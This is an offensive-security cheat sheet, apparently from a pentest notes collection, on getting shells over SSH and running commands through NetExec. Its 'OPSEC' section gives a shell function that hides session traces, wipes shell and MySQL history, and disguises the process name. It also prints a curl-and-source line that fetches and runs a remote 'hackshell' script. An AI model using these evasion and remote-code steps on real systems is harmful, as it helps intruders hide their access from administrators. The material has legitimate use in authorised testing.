---
author(s):
  - Userware
tags:
  - initial-access
  - exploitation
  - defense-evasion
  - living-off-the-land
  - T1021-004
  - network-protocols
  - ssh
  - cross-platform
---
# Unix Shell

## 01 - Manual

### 1.1 - Authenticating via Password

```
$ ssh [-oHostKeyAlgorithms=+ssh-rsa] [-p <PORT>] <username>@<IP>

$ ssh [-oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-cbc] [-p <PORT>] <username>@<IP>
```

### 1.2 - Authenticating via SSH Key

Alter the SSH private key with proper permissions.

```
$ chmod 600 /path/to/key
```

Then authenticate it.

```
$ ssh -i /path/to/ssh_key [-oHostKeyAlgorithms=+ssh-rsa] <username>@<IP>
```

To convert `.ppk` files into `.pem`.

```
$ sudo apt install -y putty-tools

$ puttygen file.ppk -O private-openssh -o file.pem
```

### 1.3 - Multiple Remote Shells

Instead of passing the credentials repeatedly. Creating a **master connection** (`-M`) with a **control socket** (`-S`) will make it easier.

```
$ ssh -MS .sshmux <username>@<IP>
```

To re-authenticate without the credentials. Just specify the path of the **control socket**.

```
$ ssh -S .sshmux NONE
```

### 1.4 - OPSEC Consideration

When adding `UserKnownHostsFile=/dev/null` it won't reveal the user activity when someone's running `w` command.

```
$ ssh -o UserKnownHostsFile=/dev/null -T <username>@<IP> "/bin/bash -i"
```

This shell script function also provides with PTY and colors with most anti-forensics features to terminate the established connection.

```bash
xssh() {
    local ttyp="$(stty -g)"
    echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
    echo -e '\e[0;36msource <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\e[0m'
    echo -e "\e[2m# or: \e[0;36m\e[2mPS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
    stty raw -echo icrnl opost
    [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
    ssh -oConnectTimeout=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking="${a:-accept-new}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [uid] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}
```

The usage of this shell function as it follows.

```
$ xssh [-p <PORT>] <username>@<IP>
```

## 02 - NetExec

```
$ netexec ssh <IP> -u "<username>" -p "<password>" [--port <PORT>] -x "<commands>"
```

---
## References

### Github

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)